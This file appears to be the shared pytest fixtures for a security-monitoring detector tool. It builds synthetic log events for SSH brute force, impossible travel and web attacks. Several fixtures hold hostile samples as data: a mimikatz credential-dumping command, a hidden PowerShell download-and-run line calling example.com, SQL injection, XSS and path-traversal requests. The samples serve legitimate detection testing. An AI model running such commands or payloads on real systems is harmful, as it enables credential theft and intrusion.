"""
Shared pytest fixtures.

Run tests with::

    pytest -v

The fixtures here build small, deterministic in-memory :class:`Event`
sequences that detectors can be tested against without touching disk.
"""

from __future__ import annotations

import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

# Make ``src/`` importable without installing the package.
ROOT = Path(__file__).resolve().parents[2]
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))


UTC = timezone.utc


def E(**kwargs):
    """Tiny helper: build an :class:`Event` with sensible defaults."""
    from pysoc.models import Event
    defaults = dict(
        timestamp=datetime(2026, 3, 7, 14, 0, 0, tzinfo=UTC),
        source_type="test",
        raw={},
    )
    defaults.update(kwargs)
    return Event(**defaults)


@pytest.fixture
def event_factory():
    """Return the :func:`E` helper, bound to a fixed UTC base time."""
    return E


@pytest.fixture
def brute_force_events():
    """Six failed SSH logins for 'root' from 203.0.113.5 within 60s."""
    return [
        E(
            source_type="linux_auth",
            user_name="root",
            source_ip="203.0.113.5",
            event_action="login",
            event_outcome="failure",
            auth_method="ssh",
            timestamp=datetime(2026, 3, 7, 14, 10, 0, tzinfo=UTC) + timedelta(seconds=i * 7),
        )
        for i in range(6)
    ]


@pytest.fixture
def benign_failed_logins():
    """Three failed logins for 'bob' spread across 90s — under threshold."""
    return [
        E(
            source_type="linux_auth",
            user_name="bob",
            source_ip="10.0.0.5",
            event_action="login",
            event_outcome="failure",
            auth_method="ssh",
            timestamp=datetime(2026, 3, 7, 14, 20, 0, tzinfo=UTC) + timedelta(seconds=i * 30),
        )
        for i in range(3)
    ]


@pytest.fixture
def encoded_powershell_event():
    """A 4688 event with an encoded-PowerShell command line."""
    import base64
    payload = "Write-Host 'pysoc-test'"
    b64 = base64.b64encode(payload.encode("utf-16-le")).decode("ascii")
    return E(
        source_type="windows_json",
        user_name="admin",
        event_action="process_create",
        event_outcome="success",
        process_name="powershell.exe",
        process_parent_name="cmd.exe",
        process_command_line=f"powershell.exe -EncodedCommand {b64}",
    )


@pytest.fixture
def mimikatz_event():
    return E(
        source_type="windows_json",
        user_name="admin",
        event_action="process_create",
        event_outcome="success",
        process_name="mimikatz.exe",
        process_parent_name="powershell.exe",
        process_command_line="mimikatz.exe sekurlsa::logonpasswords exit",
    )


@pytest.fixture
def macro_word_to_powershell_event():
    return E(
        source_type="windows_json",
        user_name="carol",
        event_action="process_create",
        event_outcome="success",
        process_name="powershell.exe",
        process_parent_name="winword.exe",
        process_command_line="powershell.exe -nop -w hidden -c iex(iwr http://example.com/p)",
    )


@pytest.fixture
def sqli_request():
    return E(
        source_type="nginx",
        source_ip="203.0.113.7",
        event_action="http_request",
        event_outcome="failure",
        http_method="GET",
        http_url="/search?q=1' OR '1'='1",
        http_status_code=200,
        http_user_agent="curl/8.4.0",
    )


@pytest.fixture
def xss_request():
    return E(
        source_type="nginx",
        source_ip="203.0.113.7",
        event_action="http_request",
        event_outcome="success",
        http_method="GET",
        http_url="/search?q=<script>alert(1)</script>",
        http_status_code=200,
        http_user_agent="Mozilla/5.0",
    )


@pytest.fixture
def path_traversal_request():
    return E(
        source_type="nginx",
        source_ip="203.0.113.8",
        event_action="http_request",
        event_outcome="failure",
        http_method="GET",
        http_url="/../../etc/passwd",
        http_status_code=404,
        http_user_agent="curl/8.4.0",
    )


@pytest.fixture
def benign_web_request():
    return E(
        source_type="nginx",
        source_ip="10.0.0.5",
        event_action="http_request",
        event_outcome="success",
        http_method="GET",
        http_url="/index.html",
        http_status_code=200,
        http_user_agent="Mozilla/5.0",
    )


@pytest.fixture
def impossible_travel_pair():
    """alice logs in from US at 14:00 then from CN at 14:30."""
    return [
        E(
            source_type="json",
            user_name="alice",
            source_ip="1.2.3.4",
            source_geo_country="US",
            event_action="login",
            event_outcome="success",
            auth_method="password",
            timestamp=datetime(2026, 3, 7, 14, 0, 0, tzinfo=UTC),
        ),
        E(
            source_type="json",
            user_name="alice",
            source_ip="5.6.7.8",
            source_geo_country="CN",
            event_action="login",
            event_outcome="success",
            auth_method="password",
            timestamp=datetime(2026, 3, 7, 14, 30, 0, tzinfo=UTC),
        ),
    ]


@pytest.fixture
def same_country_logins():
    """bob logs in twice from US — should NOT fire."""
    return [
        E(
            source_type="json",
            user_name="bob",
            source_ip="1.2.3.5",
            source_geo_country="US",
            event_action="login",
            event_outcome="success",
            timestamp=datetime(2026, 3, 7, 14, 0, 0, tzinfo=UTC),
        ),
        E(
            source_type="json",
            user_name="bob",
            source_ip="1.2.3.6",
            source_geo_country="US",
            event_action="login",
            event_outcome="success",
            timestamp=datetime(2026, 3, 7, 14, 20, 0, tzinfo=UTC),
        ),
    ]


@pytest.fixture
def repo_root():
    """Absolute path to the repo root."""
    return Path(__file__).resolve().parents[2]


@pytest.fixture
def data_raw_dir(repo_root):
    """Path to data/raw/, creating it if necessary."""
    p = repo_root / "data" / "raw"
    p.mkdir(parents=True, exist_ok=True)
    return p
